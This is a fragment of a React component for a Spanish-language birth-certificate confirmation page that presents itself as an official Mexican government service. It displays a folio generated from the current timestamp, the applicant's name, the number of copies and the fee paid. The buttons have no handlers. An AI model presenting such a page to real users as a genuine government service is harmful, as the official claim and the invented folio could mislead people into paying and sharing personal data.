            
            <p style={{ 
              color: '#666', 
              fontSize: '18px',
              lineHeight: '1.6',
              marginBottom: '30px'
            }}>
              Tu acta de nacimiento ha sido generada exitosamente.<br />
              Recibirás una copia digital en tu correo electrónico en los próximos minutos.
            </p>

            <div style={{
              backgroundColor: '#f8f9fa',
              padding: '20px',
              borderRadius: '8px',
              marginBottom: '30px',
              textAlign: 'left'
            }}>
              <h3 style={{ color: '#9D2449', fontSize: '18px', fontWeight: 'bold', marginBottom: '15px' }}>
                Información de tu solicitud:
              </h3>
              <p style={{ color: '#666', fontSize: '14px', margin: '5px 0' }}>
                <strong>Folio:</strong> ACT-{Date.now().toString().slice(-8)}
              </p>
              <p style={{ color: '#666', fontSize: '14px', margin: '5px 0' }}>
                <strong>Nombre:</strong> {state.formData.nombre} {state.formData.primerApellido} {state.formData.segundoApellido}
              </p>
              <p style={{ color: '#666', fontSize: '14px', margin: '5px 0' }}>
                <strong>Copias solicitadas:</strong> {state.formData.numCopias}
              </p>
              <p style={{ color: '#666', fontSize: '14px', margin: '5px 0' }}>
                <strong>Total pagado:</strong> ${(state.formData.numCopias * 44).toFixed(2)} MXN
              </p>
            </div>

            <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
              <button
                style={{
                  backgroundColor: '#9D2449',
                  color: 'white',
                  padding: '12px 30px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  border: 'none',
                  borderRadius: '6px',
                  cursor: 'pointer'
                }}
                data-testid="button-descargar-acta"
              >
                Descargar Acta (PDF)
              </button>
              
              <button
                style={{
                  backgroundColor: 'white',
                  color: '#9D2449',
                  padding: '12px 30px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  border: '2px solid #9D2449',
                  borderRadius: '6px',
                  cursor: 'pointer'
                }}
                data-testid="button-solicitar-otra"
              >
                Solicitar Otra Acta
              </button>
            </div>
          </div>
        )}

      </main>

      {/* FOOTER */}
      <footer style={{
        backgroundColor: '#9D2449',
        color: 'white',
        padding: '40px 0',
        marginTop: '60px'
      }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', textAlign: 'center' }}>
          <p style={{ fontSize: '16px', marginBottom: '10px' }}>
            © 2024 Gobierno de México | Todos los derechos reservados
          </p>
          <p style={{ fontSize: '14px', opacity: '0.8' }}>
            Sistema oficial para la expedición de actas de nacimiento
          </p>
        </div>
      </footer>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}